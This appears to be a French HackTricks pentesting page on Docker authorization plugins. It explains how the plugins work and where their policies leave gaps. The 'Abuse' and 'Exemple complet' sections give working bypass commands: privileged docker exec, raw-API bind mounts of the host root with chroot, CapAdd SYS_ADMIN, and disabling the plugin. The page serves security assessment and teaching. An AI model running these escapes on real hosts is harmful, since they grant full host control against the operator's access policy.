# Plugins d'autorisation d'exécution

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

Les plugins d'autorisation d'exécution constituent une couche de politique supplémentaire qui décide si un appelant peut effectuer une action donnée du daemon. Docker est l'exemple classique. Par défaut, quiconque peut communiquer avec le daemon Docker dispose en pratique d'un contrôle étendu sur celui-ci. Les plugins d'autorisation cherchent à restreindre ce modèle en examinant l'identité de l'utilisateur authentifié et l'opération API demandée, puis en autorisant ou en refusant la requête selon la politique.

Ce sujet mérite sa propre page car il change le modèle d'exploitation lorsqu'un attaquant a déjà accès à une API Docker ou à un utilisateur du groupe `docker`. Dans de tels environnements, la question n'est plus seulement "can I reach the daemon?" mais aussi "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"

## Fonctionnement

Quand une requête atteint le daemon Docker, le sous-système d'autorisation peut transmettre le contexte de la requête à un ou plusieurs plugins installés. Le plugin voit l'identité de l'utilisateur authentifié, les détails de la requête, certains headers sélectionnés, et des parties du corps de la requête ou de la réponse lorsque le type de contenu le permet. Plusieurs plugins peuvent être chaînés, et l'accès n'est accordé que si tous les plugins autorisent la requête.

Ce modèle paraît robuste, mais sa sécurité dépend entièrement de la compréhension complète de l'API par l'auteur de la politique. Un plugin qui bloque `docker run --privileged` mais ignore `docker exec`, omet des clés JSON alternatives comme le champ de niveau supérieur `Binds`, ou permet l'administration des plugins peut créer une fausse impression de restriction tout en laissant des voies directes de privilege-escalation ouvertes.

## Cibles courantes des plugins

Les domaines importants à vérifier dans une politique sont :

- endpoints de création de conteneurs
- champs `HostConfig` tels que `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, et les options de partage de namespaces
- comportement de `docker exec`
- endpoints de gestion des plugins
- tout endpoint pouvant déclencher indirectement des actions runtime en dehors du modèle de politique prévu

Historiquement, des exemples tels que le plugin `authz` de Twistlock et des plugins éducatifs simples comme `authobot` ont facilité l'étude de ce modèle parce que leurs fichiers de politique et chemins de code montraient comment le mapping endpoint→action était effectivement implémenté. Pour les travaux d'évaluation, la leçon importante est que l'auteur de la politique doit comprendre l'ensemble de la surface API plutôt que seulement les commandes CLI les plus visibles.

## Abuse

Le premier objectif est de savoir ce qui est réellement bloqué. Si le daemon refuse une action, l'erreur leaks souvent le nom du plugin, ce qui aide à identifier le contrôle en place :
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si vous avez besoin d'un profilage d'endpoints plus large, des outils tels que `docker_auth_profiler` sont utiles car ils automatisent la tâche autrement répétitive de vérifier quelles routes API et quelles structures JSON sont réellement autorisées par le plugin.

Si l'environnement utilise un plugin personnalisé et que vous pouvez interagir avec l'API, énumérez quels champs d'objet sont réellement filtrés :
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ces vérifications sont importantes car de nombreux échecs d'autorisation sont spécifiques à un champ plutôt qu'à un concept. Un plugin peut rejeter un motif CLI sans bloquer complètement la structure API équivalente.

### Exemple complet : `docker exec` ajoute des privilèges après la création du conteneur

Une politique qui bloque la création de conteneurs privilégiés mais autorise la création de conteneurs non confinés ainsi que `docker exec` peut toujours être contournée :
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si le daemon accepte la deuxième étape, l'utilisateur a récupéré un processus interactif privilégié à l'intérieur d'un container que l'auteur de la politique croyait contraint.

### Exemple complet: Bind Mount Through Raw API
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La même idée peut également apparaître sous `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
L'impact est une full host filesystem escape. Le détail intéressant est que le contournement provient d'une couverture de policy incomplète plutôt que d'un kernel bug.

### Exemple complet : Unchecked Capability Attribute

Si la policy oublie de filtrer un attribut lié à capability, l'attaquant peut créer un container qui retrouve une capability dangereuse :
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Une fois que `CAP_SYS_ADMIN` ou une capacité tout aussi puissante est présente, de nombreuses breakout techniques décrites dans [capabilities.md](protections/capabilities.md) et [privileged-containers.md](privileged-containers.md) deviennent accessibles.

### Exemple complet : désactivation du plugin

Si les opérations de plugin-management sont autorisées, le bypass le plus propre peut consister à désactiver complètement le contrôle :
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Il s'agit d'une défaillance de la politique au niveau du plan de contrôle. La couche d'autorisation existe, mais l'utilisateur qu'elle était censée restreindre conserve toujours l'autorisation de la désactiver.

## Vérifications

Ces commandes visent à identifier si une couche de politique existe et si elle semble complète ou superficielle.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Ce qui est intéressant ici :

- Les messages de refus qui incluent un nom de plugin confirment la présence d'une couche d'autorisation et révèlent souvent l'implémentation exacte.
- Une liste de plugins visible par l'attaquant peut suffire à déterminer si des opérations de désactivation ou de reconfiguration sont possibles.
- Une politique qui bloque uniquement les actions CLI évidentes mais pas les requêtes API brutes doit être considérée comme contournable jusqu'à preuve du contraire.

## Paramètres d'exécution par défaut

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Non activé par défaut | L'accès au daemon est effectivement tout ou rien à moins qu'un plugin d'autorisation ne soit configuré | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level blind spots |
| Podman | Pas d'équivalent direct courant | Podman s'appuie typiquement davantage sur les permissions Unix, l'exécution rootless et les décisions d'exposition de l'API que sur les Docker-style authz plugins | exposer largement une API Podman en root, permissions de socket faibles |
| containerd / CRI-O | Modèle de contrôle différent | Ces runtimes s'appuient généralement sur les permissions du socket, les frontières de confiance du nœud et les contrôles de l'orchestrateur de couche supérieure plutôt que sur les Docker authz plugins | monter le socket dans les workloads, hypothèses de confiance node-local faibles |
| Kubernetes | Utilise authn/authz au niveau de l'API-server et des kubelet layers, pas les Docker authz plugins | Le RBAC du cluster et les admission controls sont la principale couche de politique | RBAC trop large, politique d'admission faible, exposition directe des APIs kubelet ou runtime |
{{#include ../../../banners/hacktricks-training.md}}
